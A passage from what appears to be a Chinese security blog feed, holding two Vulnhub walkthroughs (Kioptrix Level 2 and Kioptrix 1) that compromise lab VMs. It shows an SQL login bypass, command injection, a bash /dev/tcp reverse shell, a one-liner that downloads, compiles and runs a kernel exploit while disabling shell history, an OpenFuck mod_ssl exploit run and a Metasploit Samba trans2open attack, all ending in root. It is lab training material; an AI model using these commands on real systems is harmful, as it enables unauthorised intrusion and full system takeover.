    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="信息收集">信息收集</span></h2><p>同样是<code>netdiscover</code>收集信息，发现目标IP地址。</p><p>目标的IP地址为<code>192.168.43.47</code></p><p>nmap扫描端口信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A -T4 192.168.43.47</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-07 05:01 EDT</span><br><span class="line">Nmap scan report for 192.168.43.47</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1            841/udp  status</span><br><span class="line">|_  100024  1            844/tcp  status</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-10-08T00:10:47</span><br><span class="line">|_Not valid after:  2010-10-08T00:10:47</span><br><span class="line">|_ssl-date: 2018-05-07T05:51:42+00:00; -3h09m44s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:53:19:4C (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h09m44s, deviation: 0s, median: -3h09m44s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.43.47</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</span><br></pre></td></tr></table></figure><h2><span id="漏洞利用">漏洞利用</span></h2><p>存在<code>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</code>端口</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_1.png" alt=""></p><p>尝试万能密码<code>&#39; or 1=1#</code> ，成功登录。</p><p>可以看到一个执行ping命令的框框。</p><p>可见是一个命令执行漏洞。</p><p>在命令执行中是有<code>| &amp;&amp; || ;</code>这些常见的符号的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whoai||id//如果||左边的命令（命令1）未执行成功，那么就执行||右边的命令（命令2）；</span><br><span class="line">bash: whoai: 未找到命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami|id//执行后一个命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami;id//按顺序执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami&amp;&amp;id//&amp;&amp;左边的命令（命令1）返回真(即返回0，成功被执行）后，&amp;&amp;右边的命令（命令2）才能够被执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure><p>这里我们可以利用<code>| ;</code>进行命令执行</p><p>测试<code>cat /etc/passwd</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_2.png" alt=""></p><p>下面用命令执行一个交互shell.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;bash -i &gt;&amp; /dev/tcp/192.168.43.177/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>同时用<code>nc</code>监听2333端口。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3.png" alt=""></p><p>得到一个交互shell。但是权限是<code>apache</code>用户。</p><h2><span id="权限提升">权限提升</span></h2><p>当前的权限是<code>apache</code>用户,我们需要对他进行提权得到<code>root</code>权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure><p>查看当前系统版本。<code>searchsploit linux 2.6.9</code>查找相关提权漏洞</p><p><code>https://www.exploit-db.com/download/9542.c</code></p><p>利用到9542.c的exp.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cd /tmp</span><br><span class="line">bash-3.00$ wget http://192.168.43.177/9542.c</span><br><span class="line">--03:06:55--  http://192.168.43.177/9542.c</span><br><span class="line">           =&gt; `9542.c&apos;</span><br><span class="line">Connecting to 192.168.43.177:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2,645 (2.6K) [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ..                                                    100%  252.25 MB/s</span><br><span class="line"></span><br><span class="line">03:06:55 (252.25 MB/s) - `9542.c&apos; saved [2645/2645]</span><br><span class="line"></span><br><span class="line">bash-3.00$ gcc -o 9542 9542.c</span><br><span class="line">bash-3.00$ ./9542</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>提权成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;信息收集&quot;&gt;信息收集&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;同样是&lt;code&gt;netdiscover&lt;/code&gt;收集信息，发现目标IP地址。&lt;/p&gt;
&lt;p&gt;目标的IP地址为&lt;code&gt;192.168.43.47&lt;/code&gt;&lt;/p&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 1</title>
    <link href="https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-1.html"/>
    <id>https://uknowsec.cn/posts/notes/Vulnhub渗透测试练习-Kioptrix-1.html</id>
    <published>2018-05-07T07:28:05.000Z</published>
    <updated>2019-01-07T08:24:19.627Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="信息收集">信息收集</span></h2><p>通过<code>netdiscover</code>发现目标主机IP地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.63.0/16   |   Screen View: Unique Hosts         </span><br><span class="line">                                                                             </span><br><span class="line"> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180             </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      1      60  Xiaomi Communications Co L</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      1      60  Intel Corporate           </span><br><span class="line"> 192.168.43.54   00:0c:29:7c:3a:16      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><p>从扫描信息的得的目标主机的IP地址为<code>192.168.43.54</code></p><p>nmap 扫描IP的端口信息<code>nmap -A 192.168.43.54</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS 192.168.43.54</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.10 ( https://nmap.org ) at 2018-05-07 15:48 </span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.43.54</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1           1024/tcp  status</span><br><span class="line">|_  100024  1           1024/udp  status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-09-26T09:32:06</span><br><span class="line">|_Not valid after:  2010-09-26T09:32:06</span><br><span class="line">|_ssl-date: 2018-05-07T07:50:42+00:00; +1m50s from scanner time.</span><br><span class="line">| sslv2:</span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers:</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7C:3A:16 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.55 ms 192.168.43.54</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds</span><br></pre></td></tr></table></figure><p><code>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</code></p><p>443端口的服务<code>mod_ssl/2.8.4 OpenSSL/0.9.6b</code></p><p>通过<code>searchsploit mod_ssl</code>查询相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit mod_ssl</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                         |  Path</span><br><span class="line">                                       | (/usr/share/exploitdb/)</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line">Apache mod_ssl 2.0.x - Remote Denial o | exploits/linux/dos/24590.txt</span><br><span class="line">Apache mod_ssl 2.8.x - Off-by-One HTAc | exploits/multiple/dos/21575.txt</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;Open | exploits/unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;Open | exploits/unix/remote/764.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0. | exploits/unix/remote/40347.txt</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>这里可以利用第4个漏洞的exp脚本进行攻击，<code>exploit-db</code>下载相关exp。</p><h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="openfuck漏洞利用">OpenFuck漏洞利用</span></h3><p>这是一个远程溢出的漏洞，下载的exp比较久远需要做一些修改。</p><ul><li>编译需要用的<code>libssl-dev</code>库，且版本为<code>apt-get install libssl1.0-dev</code></li><li>在exp中加入头文件<code>&lt;openssl/rc4.h&gt;</code>和<code>&lt;openssl/md5.h&gt;</code></li><li>替换exp中的<code>wget</code>后的url为<code>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</code></li><li>第961行,修改为<code>const unsigned char * p，* end;</code></li></ul><p>然后编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o OpenFuck 764.c -lcrypto</span><br></pre></td></tr></table></figure></p><p>运行脚本<code>./OpenFuck</code>选择相应我系统版本</p><p>这里选择 0x6b</p><p>执行相关的命令<code>./OpenFuck 0x6b 192.168.43.54</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.43.54</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/030exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">--04:04:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br><span class="line">--04:04:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ...                                                   100% @   3.74 MB/s</span><br><span class="line"></span><br><span class="line">04:04:39 (3.74 MB/s) - `ptrace-kmod.c&apos; saved [3921/3921]</span><br><span class="line"></span><br><span class="line">[+] Attached to 6498</span><br><span class="line">[+] Waiting for signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now wait for suid shell...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3><span id="samba漏洞利用">Samba漏洞利用</span></h3><p>实验环境是存在一个samba漏洞的，</p><p>这里用到<code>enum4linux</code>其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。</p><p>但我本地环境没有检测到samba的版本</p><p>该漏洞为<code>Samba trans2open溢出（Linux x86）</code>在Samba 2.2.0到2.2.8版本中发现的缓冲区溢出.</p><p>同样可以在<code>searchsploit</code>查到</p><p>这里直接用msf环境进行实验。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/samba/trans2open) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST  192.168.43.54   yes       The target address</span><br><span class="line">   RPORT  139              yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.54   no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">msf exploit(linux/samba/trans2open) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] Command shell session 2 opened (192.168.43.177:33375 -&gt; 192.168.43.54:4444) at 2018-05-07 04:47:42 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=99(nobody)</span><br></pre></td></tr></table></figure><h2><span id="总结">总结</span></h2><p>虽然说这个实验环境比较老，一些漏洞可能在现实的实战中是很少存在的。但是在这个漏洞利用的过程中可以学到一些<code>kali linux</code>的工具的利用和一些实战的思路。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;信息收集&quot;&gt;信息收集&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;通过&lt;code&gt;netdiscover&lt;/code&gt;发现目标主机IP地址。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习 - Zico2</title>
    <link href="https://uknowsec.cn/posts/notes/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Zico2.html"/>
    <id>https://uknowsec.cn/posts/notes/vulnhub渗透测试练习-Zico2.html</id>
    <published>2018-05-05T14:30:35.000Z</published>
    <updated>2019-01-07T08:24:19.703Z</updated>
    
